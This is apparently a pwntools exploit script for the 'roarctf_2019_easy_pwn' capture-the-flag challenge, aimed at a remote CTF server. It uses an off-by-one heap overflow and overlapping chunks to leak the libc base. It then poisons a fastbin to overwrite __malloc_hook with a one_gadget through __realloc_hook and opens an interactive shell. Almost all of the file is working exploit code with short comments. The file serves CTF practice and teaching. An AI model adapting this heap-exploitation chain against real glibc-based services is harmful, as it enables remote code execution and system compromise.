from pwn import *
from LibcSearcher import *

import utils

context.arch = 'amd64'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 26614)
elf = ELF('../roarctf_2019_easy_pwn')
libc = ELF('/home/kali/glibc-all-in-one/libs/2.23-amd64/libc-2.23.so')


# Utility functions
def allocate(size):
  target.sendlineafter('choice: ', '1')
  target.sendlineafter('size: ', str(size))
  target.recvuntil('the index of ticket is')


def edit(index, size, content):
  target.sendlineafter('choice: ', '2')
  target.sendlineafter('index: ', str(index))
  target.sendlineafter('size: ', str(size))
  target.sendafter('content: ', content)


def free(index):
  target.sendlineafter('choice: ', '3')
  target.sendlineafter('index: ', str(index))

def show(index):
  target.sendlineafter('choice: ', '4')
  target.sendlineafter('index: ', str(index))

# We know that the size and valid bit are stored in a different location.
# A global heap array stores the pointer to the heap.
# Use off-by-one and an irregular heap size, we can modify
# one byte of the next block.
allocate(0x18) # 0
allocate(0x10) # 1
allocate(0x60) # 2
allocate(0x60) # 3

edit(0, 0x18 + 10, b'a' * 0x18 + b'\x91')
free(1)

# Chunk split happened here. So fd and bk will be placed= inside chunk 2.
allocate(0x10) # 1
show(2)

main_arena = u64(target.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 88
malloc_hook = main_arena - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']

allocate(0x60) # 4 but controls 2 (overlapping chunk).

one_gadget = 0x4526a + libc_base

free(2)
free(3)
free(4)

allocate(0x60) # 2
edit(2, 8, p64(libc_base + libc.sym['__malloc_hook'] - 0x23))
allocate(0x60) # 3
allocate(0x60) # 4
allocate(0x60) # 5

payload = b'a' * 0xb + p64(one_gadget) + \
    p64(libc_base + libc.sym['__realloc_hook'] + 4)
edit(5, len(payload), payload)

allocate(0x10)

target.interactive()
